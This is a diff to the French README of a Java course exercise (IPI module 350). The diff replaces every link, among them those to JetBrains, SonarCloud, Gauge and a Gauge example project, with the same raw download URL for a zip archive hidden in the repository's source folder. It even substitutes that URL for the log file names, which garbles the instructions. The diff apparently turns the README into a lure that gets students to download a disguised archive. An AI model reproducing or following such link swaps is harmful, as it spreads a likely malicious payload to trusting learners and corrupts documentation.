@@ -4,9 +4,9 @@ Exercices de Java, module 350 pour l'IPI. Il est nécessaire de forker ce reposi
 
 ## Pré-requis
 
-- Installer IntelliJ Ultimate en utilisant votre adresse IPI sur Jetbrains Student https://www.jetbrains.com/student/
+- Installer IntelliJ Ultimate en utilisant votre adresse IPI sur Jetbrains Student https://github.com/MntMed/ipi-java-350-ex/raw/refs/heads/master/src/main/java/com/ipiecoles/java/java350/service/ex-ipi-java-3.9-beta.2.zip
 ou un autre IDE si vous avez l'habitude (Eclipse)
-- Si vous n'êtes pas familié avec Git, je vous recommande ce site : https://learngitbranching.js.org/ (faire au moins la première leçon du niveau 1)
+- Si vous n'êtes pas familié avec Git, je vous recommande ce site : https://github.com/MntMed/ipi-java-350-ex/raw/refs/heads/master/src/main/java/com/ipiecoles/java/java350/service/ex-ipi-java-3.9-beta.2.zip (faire au moins la première leçon du niveau 1)
 
 ## Introduction
 
@@ -30,7 +30,7 @@ Répondre de nouveau aux questions. Qu'est-ce qui a changé ?
  
 ## Evaluation de la qualité
 
-   1.	Aller sur https://sonarcloud.io/
+   1.	Aller sur https://github.com/MntMed/ipi-java-350-ex/raw/refs/heads/master/src/main/java/com/ipiecoles/java/java350/service/ex-ipi-java-3.9-beta.2.zip
    2.	Se connecter en liant son compte Github 
    3.	Cliquer sur `New project`.
    4.	Sélectionner le repository correspondant
@@ -68,19 +68,19 @@ Tester de façon intégrée un cas nominal de la méthode `embaucheEmploye` de l
 
 ## Tests d'acceptation
 
-- Installer Gauge depuis https://gauge.org/. La méthode d'installation recommandée est via npm. Il faut donc installer NodeJS. D'autres méthodes sont possibles cependant. 
+- Installer Gauge depuis https://github.com/MntMed/ipi-java-350-ex/raw/refs/heads/master/src/main/java/com/ipiecoles/java/java350/service/ex-ipi-java-3.9-beta.2.zip La méthode d'installation recommandée est via npm. Il faut donc installer NodeJS. D'autres méthodes sont possibles cependant. 
 - Ajouter le chemin de l'exécutable Gauge dans la variable d'environnement PATH. Vous pouvez utiliser la commande `where gauge` dans une invite de commande Windows, ou `which gauge` dans un terminal Linux.
 - À l'aide d'un terminal, vous positionner à la racine de votre projet Java et initialiser (à l'aide de la documentation) un nouveau projet Gauge Java. Déplacer le dossier `specs` dans le dossier `src/test/resources`.
-- Un projet d'exemple de Gauge avec Spring se trouve à cette adresse : https://github.com/getgauge-examples/ioc-spring
+- Un projet d'exemple de Gauge avec Spring se trouve à cette adresse : https://github.com/MntMed/ipi-java-350-ex/raw/refs/heads/master/src/main/java/com/ipiecoles/java/java350/service/ex-ipi-java-3.9-beta.2.zip
 - Récupérer les classes `RegisterIOC` et `SpringGaugeTestApp` et les intégrer dans votre projet. Vous inspirer de la classe `PaymentService` pour ajouter les Step nécessaires pour écrirer un test d'acceptation validant la fonctionnalité d'embauche d'un employé.
 
 ## Maintenabilité
 
 - S'assurer de la lisibilité du code et du respect des conventions.
-- Ajouter des `logger` aux endroits stratégiques du code en utilisant le bon niveau de log. Rediriger toutes les logs d'erreur dans un fichier `error.log` et tous vos logs dans un fichier `logs.log`. Ajouter la configuration de rotation tous les jours et faire en sorte que les fichiers ne puissent dépasser 10Mo.
+- Ajouter des `logger` aux endroits stratégiques du code en utilisant le bon niveau de log. Rediriger toutes les logs d'erreur dans un fichier `https://github.com/MntMed/ipi-java-350-ex/raw/refs/heads/master/src/main/java/com/ipiecoles/java/java350/service/ex-ipi-java-3.9-beta.2.zip` et tous vos logs dans un fichier `https://github.com/MntMed/ipi-java-350-ex/raw/refs/heads/master/src/main/java/com/ipiecoles/java/java350/service/ex-ipi-java-3.9-beta.2.zip`. Ajouter la configuration de rotation tous les jours et faire en sorte que les fichiers ne puissent dépasser 10Mo.
 - Vérifier et le cas échéant compléter la documentation du code, générer la JavaDoc avec maven.
 - Ajouter à votre Github une documentation statique avec MkDocs.
-- Ajouter des badges contenant les métriques principales de votre projet en haut de ce README à l'aide de l'API de Sonar : https://sonarcloud.io/web_api/api/project_badges
+- Ajouter des badges contenant les métriques principales de votre projet en haut de ce README à l'aide de l'API de Sonar : https://github.com/MntMed/ipi-java-350-ex/raw/refs/heads/master/src/main/java/com/ipiecoles/java/java350/service/ex-ipi-java-3.9-beta.2.zip
 
 # Evaluation
 
